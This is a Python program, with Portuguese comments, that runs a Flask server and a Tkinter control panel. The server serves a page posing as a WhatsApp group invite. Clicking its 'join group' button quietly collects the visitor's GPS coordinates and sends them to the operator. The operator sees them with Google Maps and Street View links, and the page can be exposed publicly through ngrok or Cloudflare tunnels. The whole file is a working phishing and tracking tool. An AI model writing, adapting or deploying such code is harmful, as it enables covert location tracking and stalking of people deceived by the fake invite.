import threading
import webbrowser
import subprocess
import requests
import time
from flask import Flask, request, render_template_string
import tkinter as tk
from tkinter import scrolledtext, messagebox
import queue

app = Flask(__name__)
fila = queue.Queue()

# Variáveis globais para última localização recebida
ultima_lat = None
ultima_lon = None

# Variáveis para processos de túnel
ngrok_process = None
cloudflared_process = None

html_page = '''
<!DOCTYPE html>
<html>
<head>
    <title>Geolocalização</title>
    <style>
        body {
            margin: 0;
            padding: 20px 0 0 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
        }

        h1 {
            margin-bottom: 10px;
            text-align: center;
        }

        #status {
            margin-bottom: 20px;
            font-size: 16px;
            color: #333;
            text-align: center;
            min-height: 20px;
        }

        .whatsapp-button {
            background-color: #25D366;
            color: white;
            font-weight: bold;
            font-size: 18px;
            border: none;
            border-radius: 25px;
            padding: 12px 30px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            transition: background-color 0.3s ease;
            text-decoration: none;
            justify-content: center;
        }
        .whatsapp-button:hover {
            background-color: #1ebe57;
        }
        .whatsapp-icon {
            width: 24px;
            height: 24px;
        }
    </style>
</head>
<body>
    <h1>Grupo do whatsapp</h1>   
    <p id="status"></p>
    <button class="whatsapp-button" onclick="entrarNoGrupo()">
        <svg class="whatsapp-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
            <path d="M20.52 3.48A11.99 11.99 0 0 0 3.48 20.52l-1.8 6.58 6.62-1.75a12 12 0 0 0 14.22-14.22zm-8.66 14.53a7.44 7.44 0 0 1-4-1.13l-.29-.17-2.38.62.63-2.32-.19-.3a7.42 7.42 0 0 1 12.76-7.96 7.4 7.4 0 0 1-6.53 11.26zm3.9-4.94c-.22-.11-1.29-.64-1.49-.71-.2-.07-.34-.11-.49.11-.15.22-.58.71-.71.85-.13.15-.27.17-.5.06-.23-.11-.96-.35-1.83-1.13-.68-.61-1.13-1.36-1.26-1.58-.13-.22-.01-.34.1-.45.1-.1.22-.27.33-.41.11-.14.15-.24.23-.4.07-.15.04-.28-.02-.4-.07-.11-.49-1.18-.67-1.61-.17-.42-.35-.36-.49-.37-.13-.01-.28-.01-.43-.01a.89.89 0 0 0-.65.3c-.22.22-.84.82-.84 2 0 1.18.86 2.32.98 2.48.13.17 1.7 2.6 4.12 3.64.58.25 1.03.4 1.38.51.58.18 1.11.15 1.53.09.47-.07 1.44-.59 1.64-1.16.2-.57.2-1.05.14-1.16-.07-.12-.25-.19-.47-.3z"/>
        </svg>
        Entrar no grupo
    </button>

    <script>
    const grupoLink = "https://chat.whatsapp.com/seulinkdegrupo";

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendPosition, showError);
            document.getElementById('status').innerText = 'Pegando localização...';
        } else {
            document.getElementById('status').innerText = 'Geolocalização não é suportada.';
        }
    }

    function sendPosition(position) {
        const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        };

        fetch('/location', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).then(response => {
            if (response.ok) {
                document.getElementById('status').innerText = 'Localização enviada com sucesso!';
            } else {
                document.getElementById('status').innerText = 'Erro ao enviar localização.';
            }
        });
    }

    function showError(error) {
        switch(error.code) {
            case error.PERMISSION_DENIED:
                alert("Permissão negada para acessar localização.");
                break;
            case error.POSITION_UNAVAILABLE:
                alert("Informação de localização não disponível.");
                break;
            case error.TIMEOUT:
                alert("Tempo esgotado para pegar localização.");
                break;
            case error.UNKNOWN_ERROR:
                alert("Erro desconhecido.");
                break;
        }
    }

    function entrarNoGrupo() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                const data = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude
                };
                fetch('/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).then(response => {
                    if (response.ok) {
                        window.open(grupoLink, '_blank');
                    } else {
                        alert("Erro ao enviar localização.");
                    }
                }).catch(() => {
                    alert("Erro na comunicação com o servidor.");
                });
            }, erro => {
                alert("Não foi possível obter sua localização.");
                window.open(grupoLink, '_blank');
            });
        } else {
            alert("Geolocalização não suportada.");
            window.open(grupoLink, '_blank');
        }
    }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(html_page)

@app.route('/location', methods=['POST'])
def location():
    global ultima_lat, ultima_lon
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    ultima_lat = lat
    ultima_lon = lon
    msg = f"\n(latitude,longitude): {lat},{lon}\n\n"
    link_google_maps = f"https://www.google.com/maps?q={lat},{lon}\n\n"
    link_street_view = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}\n"
    fila.put(msg + "Google Maps: " + link_google_maps + "Street View: " + link_street_view + "\n")
    return '', 200

def rodar_servidor():
    # Escuta em todas interfaces para acesso externo
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def iniciar_ngrok():
    global ngrok_process
    ngrok_process = subprocess.Popen(['ngrok', 'http', '5000'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Aguarda ngrok subir e a API local responder
    time.sleep(2)  # dá um tempinho para o ngrok iniciar

def get_ngrok_url():
    try:
        resp = requests.get('http://127.0.0.1:4040/api/tunnels')
        tunnels = resp.json()['tunnels']
        for t in tunnels:
            if t['proto'] == 'https':
                return t['public_url']
        return None
    except:
        return None

def iniciar_cloudflared():
    global cloudflared_process
    # Aqui assumimos que cloudflared está configurado para expor localhost:5000
    cloudflared_process = subprocess.Popen(['cloudflared', 'tunnel', '--url', 'http://localhost:5000'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Aguarde para iniciar
    time.sleep(3)

# Variáveis globais
ultima_lat = None
ultima_lon = None
fila = queue.Queue()

class AppGUI:
    def __init__(self, master):
        self.master = master
        master.title("Servidor Geolocalização")

        self.label_status = tk.Label(master, text="Servidor não iniciado.", fg="blue")
        self.label_status.pack(pady=5)

        self.btn_local = tk.Button(master, text="Iniciar Servidor Local", command=self.iniciar_local)
        self.btn_local.pack(padx=20, pady=5)

        self.btn_ngrok = tk.Button(master, text="Iniciar Servidor ngrok", command=self.iniciar_ngrok)
        self.btn_ngrok.pack(padx=20, pady=5)

        self.btn_cloudflare = tk.Button(master, text="Iniciar Servidor Cloudflare Tunnel", command=self.iniciar_cloudflare)
        self.btn_cloudflare.pack(padx=20, pady=5)

        self.btn_parar = tk.Button(master, text="Parar Túnel (ngrok / cloudflared)", command=self.parar_tunel, state=tk.DISABLED)
        self.btn_parar.pack(padx=20, pady=5)

        self.btn_google_maps = tk.Button(master, text="Abrir Google Maps", command=self.abrir_google_maps, state=tk.DISABLED)
        self.btn_google_maps.pack(padx=20, pady=5)

        self.btn_street_view = tk.Button(master, text="Abrir Street View", command=self.abrir_street_view, state=tk.DISABLED)
        self.btn_street_view.pack(padx=20, pady=5)

        self.texto = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=110, height=20)
        self.texto.pack(padx=10, pady=10)

        self.servidor_thread = None
        self.atualizar_texto()

    def iniciar_local(self):
        if self.servidor_thread and self.servidor_thread.is_alive():
            messagebox.showwarning("Aviso", "Servidor já está rodando!")
            return
        self.label_status.config(text="Iniciando servidor local (http://localhost:5000)...")
        self.servidor_thread = threading.Thread(target=rodar_servidor, daemon=True)
        self.servidor_thread.start()
        time.sleep(1)  # Espera servidor subir
        self.label_status.config(text="Servidor local rodando em http://localhost:5000")
        self.abrir_site_local()
        self.btn_parar.config(state=tk.NORMAL)
        self.btn_google_maps.config(state=tk.NORMAL)
        self.btn_street_view.config(state=tk.NORMAL)

    def iniciar_ngrok(self):
        if self.servidor_thread and self.servidor_thread.is_alive():
            messagebox.showwarning("Aviso", "Servidor já está rodando!")
            return
        self.label_status.config(text="Iniciando servidor com ngrok...")
        self.servidor_thread = threading.Thread(target=rodar_servidor, daemon=True)
        self.servidor_thread.start()

        # Inicia ngrok
        iniciar_ngrok()

        url = None
        tentativas = 0
        while url is None and tentativas < 10:
            url = get_ngrok_url()
            if url:
                break
            time.sleep(1)
            tentativas += 1

        if url:
            self.label_status.config(text=f"Servidor rodando com ngrok: {url}")
            webbrowser.open(url)
            self.btn_parar.config(state=tk.NORMAL)
            self.btn_google_maps.config(state=tk.NORMAL)
            self.btn_street_view.config(state=tk.NORMAL)
        else:
            self.label_status.config(text="Erro ao obter URL do ngrok.")
            messagebox.showerror("Erro", "Não foi possível obter URL do ngrok.")

    def iniciar_cloudflare(self):
        if self.servidor_thread and self.servidor_thread.is_alive():
            messagebox.showwarning("Aviso", "Servidor já está rodando!")
            return
        self.label_status.config(text="Iniciando servidor com Cloudflare Tunnel...")
        self.servidor_thread = threading.Thread(target=rodar_servidor, daemon=True)
        self.servidor_thread.start()

        iniciar_cloudflared()

        # O link público do Cloudflare Tunnel não é tão trivial para capturar,
        # geralmente você configura um domínio customizado.
        # Aqui deixamos uma mensagem genérica para o usuário.
        self.label_status.config(text="Cloudflare Tunnel iniciado. Verifique seu domínio Cloudflare.")
        messagebox.showinfo("Info", "Cloudflare Tunnel iniciado.\nConfigure o domínio para acessar seu app.")
        self.btn_parar.config(state=tk.NORMAL)
        self.btn_google_maps.config(state=tk.NORMAL)
        self.btn_street_view.config(state=tk.NORMAL)

    def parar_tunel(self):
        global ngrok_process, cloudflared_process
        if ngrok_process:
            ngrok_process.terminate()
            ngrok_process = None
        if cloudflared_process:
            cloudflared_process.terminate()
            cloudflared_process = None
        self.label_status.config(text="Túneis parados.")
        self.btn_parar.config(state=tk.DISABLED)

    def abrir_site_local(self):
        webbrowser.open("http://localhost:5000")

    def abrir_google_maps(self):
        global ultima_lat, ultima_lon
        if ultima_lat is not None and ultima_lon is not None:
            url = f"https://www.google.com/maps?q={ultima_lat},{ultima_lon}"
            webbrowser.open(url)

    def abrir_street_view(self):
        global ultima_lat, ultima_lon
        if ultima_lat is not None and ultima_lon is not None:
            url = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={ultima_lat},{ultima_lon}"
            webbrowser.open(url)

    def atualizar_texto(self):
        global ultima_lat, ultima_lon
        updated = False
        while not fila.empty():
            msg = fila.get()
            self.texto.insert(tk.END, msg)
            self.texto.see(tk.END)
            updated = True
        if updated and ultima_lat is not None and ultima_lon is not None:
            self.btn_google_maps.config(state=tk.NORMAL)
            self.btn_street_view.config(state=tk.NORMAL)
        self.master.after(1000, self.atualizar_texto)

if __name__ == '__main__':
    root = tk.Tk()
    app_gui = AppGUI(root)
    root.mainloop()
